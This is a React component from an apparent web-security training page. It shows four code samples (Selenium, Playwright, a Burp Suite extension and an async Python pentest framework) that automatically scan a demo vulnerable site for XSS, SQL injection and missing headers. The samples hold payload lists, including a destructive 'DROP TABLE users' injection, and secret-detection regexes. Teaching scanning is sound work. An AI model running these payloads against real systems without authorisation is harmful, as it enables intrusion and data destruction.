
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { TestTube, Globe, Zap, Bot } from 'lucide-react';

const TestingFrameworks: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <TestTube className="h-6 w-6" />
          Automated Testing Frameworks
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="selenium-automation" className="w-full">
          <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full mb-6">
            <TabsTrigger value="selenium-automation">Selenium</TabsTrigger>
            <TabsTrigger value="playwright-testing">Playwright</TabsTrigger>
            <TabsTrigger value="burp-extensions">Burp Extensions</TabsTrigger>
            <TabsTrigger value="custom-frameworks">Custom Frameworks</TabsTrigger>
          </TabsList>

          <TabsContent value="selenium-automation" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Selenium WebDriver Automation</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Automated XSS Testing</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoAlertPresentException
import time
import json

class SeleniumXSSScanner:
    def __init__(self, headless=True):
        self.options = webdriver.ChromeOptions()
        if headless:
            self.options.add_argument('--headless')
        self.options.add_argument('--no-sandbox')
        self.options.add_argument('--disable-dev-shm-usage')
        self.driver = webdriver.Chrome(options=self.options)
        self.wait = WebDriverWait(self.driver, 10)
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        self.vulnerabilities = []
    
    def find_input_fields(self):
        """Find all input fields on the page"""
        inputs = []
        
        # Text inputs
        text_inputs = self.driver.find_elements(By.CSS_SELECTOR, 
            "input[type='text'], input[type='search'], input[type='url'], input[type='email']")
        inputs.extend(text_inputs)
        
        # Textareas
        textareas = self.driver.find_elements(By.TAG_NAME, "textarea")
        inputs.extend(textareas)
        
        # Other input types
        other_inputs = self.driver.find_elements(By.CSS_SELECTOR,
            "input:not([type='submit']):not([type='button']):not([type='hidden'])")
        inputs.extend(other_inputs)
        
        return inputs
    
    def test_xss_payload(self, element, payload):
        """Test a single XSS payload on an element"""
        try:
            # Clear and enter payload
            element.clear()
            element.send_keys(payload)
            
            # Look for submit button or form
            form = element.find_element(By.XPATH, "./ancestor::form[1]")
            submit_btn = form.find_element(By.CSS_SELECTOR, 
                "input[type='submit'], button[type='submit'], button:not([type])")
            submit_btn.click()
            
            # Wait a moment for page to load
            time.sleep(2)
            
            # Check for alert
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                
                return True, f"Alert detected: {alert_text}"
            except NoAlertPresentException:
                # Check if payload is reflected in page source
                if payload in self.driver.page_source:
                    return True, "Payload reflected in page source"
                return False, "No XSS detected"
                
        except Exception as e:
            return False, f"Error testing payload: {str(e)}"
    
    def scan_page(self, url):
        """Scan a single page for XSS vulnerabilities"""
        print(f"Scanning {url} for XSS vulnerabilities...")
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # Find all input fields
            input_fields = self.find_input_fields()
            print(f"Found {len(input_fields)} input fields")
            
            for i, input_field in enumerate(input_fields):
                print(f"Testing input field {i+1}/{len(input_fields)}")
                
                for payload in self.xss_payloads:
                    # Navigate back to original page
                    self.driver.get(url)
                    time.sleep(1)
                    
                    # Find the input field again (stale reference)
                    current_inputs = self.find_input_fields()
                    if i < len(current_inputs):
                        current_input = current_inputs[i]
                        
                        success, message = self.test_xss_payload(current_input, payload)
                        
                        if success:
                            vulnerability = {
                                'url': url,
                                'element': current_input.get_attribute('name') or 'unnamed',
                                'payload': payload,
                                'message': message,
                                'type': 'Reflected XSS'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"[VULNERABLE] {message}")
                            break  # Move to next input field
            
        except Exception as e:
            print(f"Error scanning {url}: {str(e)}")
    
    def scan_multiple_pages(self, urls):
        """Scan multiple pages"""
        for url in urls:
            self.scan_page(url)
    
    def generate_report(self, output_file='xss_scan_report.json'):
        """Generate scan report"""
        report = {
            'scan_summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"Report saved to {output_file}")
    
    def close(self):
        """Close the browser"""
        self.driver.quit()

# Usage example
if __name__ == "__main__":
    scanner = SeleniumXSSScanner(headless=False)
    
    urls_to_scan = [
        "http://testphp.vulnweb.com/search.php",
        "http://testphp.vulnweb.com/artists.php"
    ]
    
    try:
        scanner.scan_multiple_pages(urls_to_scan)
        scanner.generate_report()
        
        print(f"Scan completed. Found {len(scanner.vulnerabilities)} vulnerabilities.")
        for vuln in scanner.vulnerabilities:
            print(f"[{vuln['type']}] {vuln['url']} - {vuln['payload']}")
            
    finally:
        scanner.close()`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="playwright-testing" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Playwright Advanced Testing</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Modern Web App Security Testing</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`const { chromium } = require('playwright');
const fs = require('fs');

class PlaywrightSecurityScanner {
    constructor() {
        this.browser = null;
        this.context = null;
        this.page = null;
        this.vulnerabilities = [];
        
        this.xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\\'XSS\\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<video onloadstart=alert("XSS")><source>'
        ];
        
        this.sqlPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1--"
        ];
    }
    
    async initialize() {
        this.browser = await chromium.launch({ headless: false });
        this.context = await this.browser.newContext({
            ignoreHTTPSErrors: true,
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        });
        this.page = await this.context.newPage();
        
        // Enable request/response interception
        await this.page.route('**/*', route => {
            const request = route.request();
            console.log(\`\${request.method()} \${request.url()}\`);
            route.continue();
        });
    }
    
    async scanForXSS(url) {
        console.log(\`Scanning \${url} for XSS vulnerabilities...\`);
        
        try {
            await this.page.goto(url);
            await this.page.waitForLoadState('networkidle');
            
            // Find all input elements
            const inputs = await this.page.locator('input, textarea, select').all();
            console.log(\`Found \${inputs.length} input elements\`);
            
            for (let i = 0; i < inputs.length; i++) {
                const input = inputs[i];
                const inputType = await input.getAttribute('type');
                const inputName = await input.getAttribute('name') || \`input_\${i}\`;
                
                // Skip file inputs and hidden inputs
                if (inputType === 'file' || inputType === 'hidden') continue;
                
                for (const payload of this.xssPayloads) {
                    try {
                        // Navigate back to original page
                        await this.page.goto(url);
                        await this.page.waitForLoadState('networkidle');
                        
                        // Find form containing the input
                        const form = await this.page.locator('form').first();
                        
                        // Fill input with payload
                        await this.page.fill(\`[name="\${inputName}"]\`, payload);
                        
                        // Submit form
                        const submitBtn = await form.locator('input[type="submit"], button[type="submit"], button:not([type])').first();
                        
                        // Set up alert handler
                        let alertDetected = false;
                        this.page.on('dialog', async dialog => {
                            console.log(\`Alert detected: \${dialog.message()}\`);
                            alertDetected = true;
                            await dialog.accept();
                        });
                        
                        await submitBtn.click();
                        await this.page.waitForTimeout(2000);
                        
                        // Check if alert was triggered or payload is reflected
                        const pageContent = await this.page.content();
                        
                        if (alertDetected || pageContent.includes(payload)) {
                            this.vulnerabilities.push({
                                type: 'XSS',
                                url: url,
                                element: inputName,
                                payload: payload,
                                method: alertDetected ? 'Alert triggered' : 'Payload reflected',
                                severity: 'High'
                            });
                            
                            console.log(\`[VULNERABLE] XSS found in \${inputName} with payload: \${payload}\`);
                            break; // Move to next input
                        }
                        
                    } catch (error) {
                        console.log(\`Error testing payload on \${inputName}: \${error.message}\`);
                    }
                }
            }
            
        } catch (error) {
            console.log(\`Error scanning \${url}: \${error.message}\`);
        }
    }
    
    async scanForSQLi(url) {
        console.log(\`Scanning \${url} for SQL injection vulnerabilities...\`);
        
        try {
            await this.page.goto(url);
            await this.page.waitForLoadState('networkidle');
            
            const inputs = await this.page.locator('input[type="text"], input[type="search"], textarea').all();
            
            for (let i = 0; i < inputs.length; i++) {
                const input = inputs[i];
                const inputName = await input.getAttribute('name') || \`input_\${i}\`;
                
                for (const payload of this.sqlPayloads) {
                    try {
                        await this.page.goto(url);
                        await this.page.waitForLoadState('networkidle');
                        
                        // Fill input with SQL payload
                        await this.page.fill(\`[name="\${inputName}"]\`, payload);
                        
                        // Submit form
                        const form = await this.page.locator('form').first();
                        const submitBtn = await form.locator('input[type="submit"], button[type="submit"], button:not([type])').first();
                        await submitBtn.click();
                        
                        await this.page.waitForTimeout(2000);
                        
                        // Check for SQL error messages
                        const pageContent = await this.page.content().toLowerCase();
                        const sqlErrors = [
                            'mysql error', 'sql syntax', 'ora-', 'microsoft ole db',
                            'postgresql error', 'warning: mysql', 'sqlite error',
                            'unexpected end of sql command', 'quoted string not properly terminated'
                        ];
                        
                        const errorFound = sqlErrors.some(error => pageContent.includes(error));
                        
                        if (errorFound) {
                            this.vulnerabilities.push({
                                type: 'SQL Injection',
                                url: url,
                                element: inputName,
                                payload: payload,
                                method: 'Error-based detection',
                                severity: 'Critical'
                            });
                            
                            console.log(\`[VULNERABLE] SQL Injection found in \${inputName} with payload: \${payload}\`);
                            break;
                        }
                        
                    } catch (error) {
                        console.log(\`Error testing SQL payload on \${inputName}: \${error.message}\`);
                    }
                }
            }
            
        } catch (error) {
            console.log(\`Error scanning \${url} for SQLi: \${error.message}\`);
        }
    }
    
    async performHeaderAnalysis(url) {
        console.log(\`Analyzing security headers for \${url}...\`);
        
        try {
            const response = await this.page.goto(url);
            const headers = response.headers();
            
            const securityHeaders = {
                'content-security-policy': 'Content Security Policy',
                'x-frame-options': 'X-Frame-Options', 
                'x-content-type-options': 'X-Content-Type-Options',
                'strict-transport-security': 'HTTP Strict Transport Security',
                'x-xss-protection': 'X-XSS-Protection',
                'referrer-policy': 'Referrer Policy'
            };
            
            const missingHeaders = [];
            
            for (const [header, description] of Object.entries(securityHeaders)) {
                if (!headers[header] && !headers[header.toUpperCase()]) {
                    missingHeaders.push(description);
                }
            }
            
            if (missingHeaders.length > 0) {
                this.vulnerabilities.push({
                    type: 'Missing Security Headers',
                    url: url,
                    element: 'HTTP Headers',
                    payload: 'N/A',
                    method: \`Missing: \${missingHeaders.join(', ')}\`,
                    severity: 'Medium'
                });
            }
            
        } catch (error) {
            console.log(\`Error analyzing headers: \${error.message}\`);
        }
    }
    
    async generateReport() {
        const report = {
            scanSummary: {
                totalVulnerabilities: this.vulnerabilities.length,
                scanTimestamp: new Date().toISOString(),
                severityBreakdown: {
                    critical: this.vulnerabilities.filter(v => v.severity === 'Critical').length,
                    high: this.vulnerabilities.filter(v => v.severity === 'High').length,
                    medium: this.vulnerabilities.filter(v => v.severity === 'Medium').length,
                    low: this.vulnerabilities.filter(v => v.severity === 'Low').length
                }
            },
            vulnerabilities: this.vulnerabilities
        };
        
        fs.writeFileSync('playwright_security_scan.json', JSON.stringify(report, null, 2));
        console.log('Security scan report saved to playwright_security_scan.json');
    }
    
    async close() {
        if (this.browser) {
            await this.browser.close();
        }
    }
}

// Usage
(async () => {
    const scanner = new PlaywrightSecurityScanner();
    await scanner.initialize();
    
    const urlsToScan = [
        'http://testphp.vulnweb.com/search.php',
        'http://testphp.vulnweb.com/artists.php'
    ];
    
    try {
        for (const url of urlsToScan) {
            await scanner.scanForXSS(url);
            await scanner.scanForSQLi(url);
            await scanner.performHeaderAnalysis(url);
        }
        
        await scanner.generateReport();
        console.log(\`Scan completed. Found \${scanner.vulnerabilities.length} vulnerabilities.\`);
        
    } finally {
        await scanner.close();
    }
})();`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="burp-extensions" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Burp Suite Extensions</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Custom Burp Extension Development</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`from burp import IBurpExtender, IHttpListener, ITab
from javax.swing import JPanel, JLabel, JButton, JTextArea, JScrollPane
from java.awt import BorderLayout, GridBagLayout, GridBagConstraints
import json
import re

class BurpExtender(IBurpExtender, IHttpListener, ITab):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("Advanced Security Scanner")
        
        # Register HTTP listener
        callbacks.registerHttpListener(self)
        
        # Create GUI
        self._create_gui()
        
        # Add tab to Burp
        callbacks.addSuiteTab(self)
        
        # Initialize vulnerability storage
        self.vulnerabilities = []
        
        print("Advanced Security Scanner loaded successfully!")
    
    def _create_gui(self):
        self._panel = JPanel(BorderLayout())
        
        # Create main panel
        main_panel = JPanel(GridBagLayout())
        constraints = GridBagConstraints()
        
        # Title
        title = JLabel("Advanced Security Scanner")
        constraints.gridx = 0
        constraints.gridy = 0
        constraints.gridwidth = 2
        main_panel.add(title, constraints)
        
        # Scan button
        self._scan_button = JButton("Start Automated Scan", actionPerformed=self._start_scan)
        constraints.gridx = 0
        constraints.gridy = 1
        constraints.gridwidth = 1
        main_panel.add(self._scan_button, constraints)
        
        # Clear button
        clear_button = JButton("Clear Results", actionPerformed=self._clear_results)
        constraints.gridx = 1
        constraints.gridy = 1
        main_panel.add(clear_button, constraints)
        
        # Results area
        self._results_area = JTextArea(20, 50)
        scroll_pane = JScrollPane(self._results_area)
        constraints.gridx = 0
        constraints.gridy = 2
        constraints.gridwidth = 2
        constraints.fill = GridBagConstraints.BOTH
        constraints.weightx = 1.0
        constraints.weighty = 1.0
        main_panel.add(scroll_pane, constraints)
        
        self._panel.add(main_panel, BorderLayout.CENTER)
    
    def getTabCaption(self):
        return "Adv Scanner"
    
    def getUiComponent(self):
        return self._panel
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # Only process requests from Proxy or Target tools
        if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_TARGET:
            if messageIsRequest:
                self._analyze_request(messageInfo)
            else:
                self._analyze_response(messageInfo)
    
    def _analyze_request(self, messageInfo):
        request = messageInfo.getRequest()
        analyzedRequest = self._helpers.analyzeRequest(request)
        url = analyzedRequest.getUrl()
        
        # Check for sensitive data in parameters
        parameters = analyzedRequest.getParameters()
        for param in parameters:
            param_name = param.getName().lower()
            param_value = param.getValue()
            
            # Check for potential sensitive parameters
            sensitive_params = ['password', 'pwd', 'pass', 'secret', 'key', 'token', 'api_key']
            if any(sensitive in param_name for sensitive in sensitive_params):
                if len(param_value) < 8:  # Weak password/token
                    self._log_vulnerability("Weak Password/Token", str(url), 
                                          f"Parameter '{param_name}' has weak value: {param_value}")
    
    def _analyze_response(self, messageInfo):
        response = messageInfo.getResponse()
        if response is None:
            return
            
        analyzedResponse = self._helpers.analyzeResponse(response)
        headers = analyzedResponse.getHeaders()
        body = self._helpers.bytesToString(response[analyzedResponse.getBodyOffset():])
        
        # Check for security headers
        security_headers = {
            'X-Frame-Options': False,
            'X-Content-Type-Options': False,
            'X-XSS-Protection': False,
            'Strict-Transport-Security': False,
            'Content-Security-Policy': False
        }
        
        for header in headers:
            header_lower = header.lower()
            for sec_header in security_headers.keys():
                if sec_header.lower() in header_lower:
                    security_headers[sec_header] = True
        
        # Log missing security headers
        missing_headers = [h for h, present in security_headers.items() if not present]
        if missing_headers:
            url = self._helpers.analyzeRequest(messageInfo.getRequest()).getUrl()
            self._log_vulnerability("Missing Security Headers", str(url), 
                                  f"Missing: {', '.join(missing_headers)}")
        
        # Check for sensitive information disclosure
        sensitive_patterns = [
            (r'password[\\s]*[:=][\\s]*["\\'']([^"\\''\\s]+)', 'Password Disclosure'),
            (r'api[_-]?key[\\s]*[:=][\\s]*["\\'']([^"\\''\\s]+)', 'API Key Disclosure'),
            (r'secret[\\s]*[:=][\\s]*["\\'']([^"\\''\\s]+)', 'Secret Disclosure'),
            (r'token[\\s]*[:=][\\s]*["\\'']([^"\\''\\s]+)', 'Token Disclosure'),
            (r'(jdbc:[^\\s"\\'']+)', 'Database Connection String'),
            (r'(mongodb://[^\\s"\\'']+)', 'MongoDB Connection String')
        ]
        
        for pattern, vuln_type in sensitive_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                url = self._helpers.analyzeRequest(messageInfo.getRequest()).getUrl()
                for match in matches[:3]:  # Limit to first 3 matches
                    self._log_vulnerability(vuln_type, str(url), f"Found: {match}")
    
    def _log_vulnerability(self, vuln_type, url, details):
        vulnerability = {
            'type': vuln_type,
            'url': url,
            'details': details,
            'timestamp': str(java.util.Date())
        }
        
        self.vulnerabilities.append(vulnerability)
        
        # Update GUI
        result_text = f"[{vuln_type}] {url}\\n  Details: {details}\\n\\n"
        self._results_area.append(result_text)
        
        print(f"Vulnerability found: {vuln_type} at {url}")
    
    def _start_scan(self, event):
        self._results_area.append("Starting automated scan...\\n\\n")
        
        # Get site map from Burp
        site_map = self._callbacks.getSiteMap(None)
        
        for item in site_map[:50]:  # Limit to first 50 items
            self._scan_item(item)
        
        self._results_area.append(f"Scan completed. Found {len(self.vulnerabilities)} vulnerabilities.\\n")
    
    def _scan_item(self, item):
        request = item.getRequest()
        if request is None:
            return
            
        analyzed_request = self._helpers.analyzeRequest(request)
        url = analyzed_request.getUrl()
        
        # Test for common vulnerabilities
        self._test_sql_injection(item)
        self._test_xss(item)
    
    def _test_sql_injection(self, item):
        request = item.getRequest()
        analyzed_request = self._helpers.analyzeRequest(request)
        parameters = analyzed_request.getParameters()
        
        sql_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users--"]
        
        for param in parameters:
            if param.getType() == 0:  # URL parameter
                for payload in sql_payloads:
                    # Create new request with SQL payload
                    new_param = self._helpers.buildParameter(param.getName(), payload, param.getType())
                    new_request = self._helpers.updateParameter(request, new_param)
                    
                    # Make request and analyze response
                    try:
                        response = self._callbacks.makeHttpRequest(item.getHttpService(), new_request)
                        if response:
                            response_body = self._helpers.bytesToString(
                                response.getResponse()[self._helpers.analyzeResponse(response.getResponse()).getBodyOffset():])
                            
                            # Check for SQL error messages
                            sql_errors = ['mysql error', 'sql syntax', 'ora-', 'postgresql error']
                            if any(error in response_body.lower() for error in sql_errors):
                                self._log_vulnerability("SQL Injection", str(analyzed_request.getUrl()), 
                                                      f"Parameter: {param.getName()}, Payload: {payload}")
                                break
                    except:
                        pass
    
    def _test_xss(self, item):
        request = item.getRequest()
        analyzed_request = self._helpers.analyzeRequest(request)
        parameters = analyzed_request.getParameters()
        
        xss_payload = "<script>alert('XSS')</script>"
        
        for param in parameters:
            if param.getType() == 0:  # URL parameter
                # Create new request with XSS payload
                new_param = self._helpers.buildParameter(param.getName(), xss_payload, param.getType())
                new_request = self._helpers.updateParameter(request, new_param)
                
                try:
                    response = self._callbacks.makeHttpRequest(item.getHttpService(), new_request)
                    if response:
                        response_body = self._helpers.bytesToString(
                            response.getResponse()[self._helpers.analyzeResponse(response.getResponse()).getBodyOffset():])
                        
                        # Check if payload is reflected
                        if xss_payload in response_body:
                            self._log_vulnerability("Cross-Site Scripting", str(analyzed_request.getUrl()), 
                                                  f"Parameter: {param.getName()}, Payload reflected")
                            break
                except:
                    pass
    
    def _clear_results(self, event):
        self._results_area.setText("")
        self.vulnerabilities = []
        print("Results cleared")`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="custom-frameworks" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Custom Testing Frameworks</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Modular Penetration Testing Framework</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`import asyncio
import aiohttp
import json
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Callable
from concurrent.futures import ThreadPoolExecutor
import logging

@dataclass
class TestResult:
    test_name: str
    target: str
    status: str  # 'passed', 'failed', 'vulnerable', 'error'
    severity: str  # 'critical', 'high', 'medium', 'low', 'info'
    details: str
    timestamp: str
    evidence: Optional[Dict] = None

class BaseTest(ABC):
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        self.logger = logging.getLogger(f"test.{name}")
    
    @abstractmethod
    async def run_test(self, target: str, session: aiohttp.ClientSession, **kwargs) -> TestResult:
        pass

class SQLInjectionTest(BaseTest):
    def __init__(self):
        super().__init__("SQL Injection", "Tests for SQL injection vulnerabilities")
        self.payloads = [
            "'",
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        self.error_patterns = [
            'mysql error', 'sql syntax', 'ora-', 'postgresql error',
            'sqlite error', 'microsoft ole db', 'warning: mysql'
        ]
    
    async def run_test(self, target: str, session: aiohttp.ClientSession, **kwargs) -> TestResult:
        try:
            # Test each payload
            for payload in self.payloads:
                test_url = f"{target}?id={payload}"
                
                async with session.get(test_url, timeout=10) as response:
                    content = await response.text()
                    
                    # Check for SQL error messages
                    for error_pattern in self.error_patterns:
                        if error_pattern in content.lower():
                            return TestResult(
                                test_name=self.name,
                                target=target,
                                status='vulnerable',
                                severity='critical',
                                details=f"SQL injection detected with payload: {payload}",
                                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                                evidence={'payload': payload, 'error_pattern': error_pattern}
                            )
            
            return TestResult(
                test_name=self.name,
                target=target,
                status='passed',
                severity='info',
                details="No SQL injection vulnerabilities detected",
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
            )
            
        except Exception as e:
            return TestResult(
                test_name=self.name,
                target=target,
                status='error',
                severity='info',
                details=f"Test error: {str(e)}",
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
            )

class XSSTest(BaseTest):
    def __init__(self):
        super().__init__("Cross-Site Scripting", "Tests for XSS vulnerabilities")
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\\'XSS\\')">',
            '<body onload=alert("XSS")>'
        ]
    
    async def run_test(self, target: str, session: aiohttp.ClientSession, **kwargs) -> TestResult:
        try:
            for payload in self.payloads:
                # Test GET parameter
                test_url = f"{target}?search={payload}"
                
                async with session.get(test_url, timeout=10) as response:
                    content = await response.text()
                    
                    # Check if payload is reflected
                    if payload in content:
                        return TestResult(
                            test_name=self.name,
                            target=target,
                            status='vulnerable',
                            severity='high',
                            details=f"XSS vulnerability detected with payload: {payload}",
                            timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                            evidence={'payload': payload, 'reflected': True}
                        )
            
            return TestResult(
                test_name=self.name,
                target=target,
                status='passed',
                severity='info',
                details="No XSS vulnerabilities detected",
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
            )
            
        except Exception as e:
            return TestResult(
                test_name=self.name,
                target=target,
                status='error',
                severity='info',
                details=f"Test error: {str(e)}",
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
            )

class SecurityHeadersTest(BaseTest):
    def __init__(self):
        super().__init__("Security Headers", "Checks for security headers")
        self.required_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME type sniffing protection',
            'X-XSS-Protection': 'XSS filter',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content security policy'
        }
    
    async def run_test(self, target: str, session: aiohttp.ClientSession, **kwargs) -> TestResult:
        try:
            async with session.get(target, timeout=10) as response:
                headers = response.headers
                missing_headers = []
                
                for header, description in self.required_headers.items():
                    if header not in headers and header.lower() not in [h.lower() for h in headers.keys()]:
                        missing_headers.append(f"{header} ({description})")
                
                if missing_headers:
                    return TestResult(
                        test_name=self.name,
                        target=target,
                        status='vulnerable',
                        severity='medium',
                        details=f"Missing security headers: {', '.join(missing_headers)}",
                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                        evidence={'missing_headers': missing_headers}
                    )
                else:
                    return TestResult(
                        test_name=self.name,
                        target=target,
                        status='passed',
                        severity='info',
                        details="All required security headers are present",
                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
                    )
        
        except Exception as e:
            return TestResult(
                test_name=self.name,
                target=target,
                status='error',
                severity='info',
                details=f"Test error: {str(e)}",
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
            )

class PenetrationTestingFramework:
    def __init__(self):
        self.tests: List[BaseTest] = []
        self.results: List[TestResult] = []
        self.logger = self._setup_logger()
        
    def _setup_logger(self):
        logger = logging.getLogger('pentesting_framework')
        logger.setLevel(logging.INFO)
        
        handler = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        
        return logger
    
    def register_test(self, test: BaseTest):
        self.tests.append(test)
        self.logger.info(f"Registered test: {test.name}")
    
    async def run_single_test(self, test: BaseTest, target: str, session: aiohttp.ClientSession) -> TestResult:
        self.logger.info(f"Running {test.name} against {target}")
        result = await test.run_test(target, session)
        self.results.append(result)
        return result
    
    async def run_all_tests(self, targets: List[str], max_concurrent: int = 10):
        self.logger.info(f"Starting penetration test against {len(targets)} targets")
        
        connector = aiohttp.TCPConnector(limit=max_concurrent)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            
            for target in targets:
                for test in self.tests:
                    task = self.run_single_test(test, target, session)
                    tasks.append(task)
            
            # Run tests with controlled concurrency
            semaphore = asyncio.Semaphore(max_concurrent)
            
            async def bounded_test(task):
                async with semaphore:
                    return await task
            
            results = await asyncio.gather(*[bounded_test(task) for task in tasks])
            
        self.logger.info(f"Completed all tests. Total results: {len(self.results)}")
        return results
    
    def generate_report(self, output_file: str = 'pentest_report.json'):
        report = {
            'scan_summary': {
                'total_tests': len(self.results),
                'vulnerabilities_found': len([r for r in self.results if r.status == 'vulnerable']),
                'tests_passed': len([r for r in self.results if r.status == 'passed']),
                'tests_failed': len([r for r in self.results if r.status == 'failed']),
                'test_errors': len([r for r in self.results if r.status == 'error']),
                'severity_breakdown': {
                    'critical': len([r for r in self.results if r.severity == 'critical']),
                    'high': len([r for r in self.results if r.severity == 'high']),
                    'medium': len([r for r in self.results if r.severity == 'medium']),
                    'low': len([r for r in self.results if r.severity == 'low'])
                },
                'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            },
            'detailed_results': [asdict(result) for result in self.results]
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Report generated: {output_file}")
        return report

# Usage example
async def main():
    framework = PenetrationTestingFramework()
    
    # Register tests
    framework.register_test(SQLInjectionTest())
    framework.register_test(XSSTest())
    framework.register_test(SecurityHeadersTest())
    
    # Define targets
    targets = [
        'http://testphp.vulnweb.com',
        'http://testphp.vulnweb.com/artists.php',
        'http://testphp.vulnweb.com/search.php'
    ]
    
    # Run tests
    await framework.run_all_tests(targets)
    
    # Generate report
    report = framework.generate_report()
    
    print(f"Scan completed!")
    print(f"Total vulnerabilities found: {report['scan_summary']['vulnerabilities_found']}")
    print(f"Critical: {report['scan_summary']['severity_breakdown']['critical']}")
    print(f"High: {report['scan_summary']['severity_breakdown']['high']}")
    print(f"Medium: {report['scan_summary']['severity_breakdown']['medium']}")

# Run the framework
if __name__ == "__main__":
    asyncio.run(main())`}
                </pre>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default TestingFrameworks;
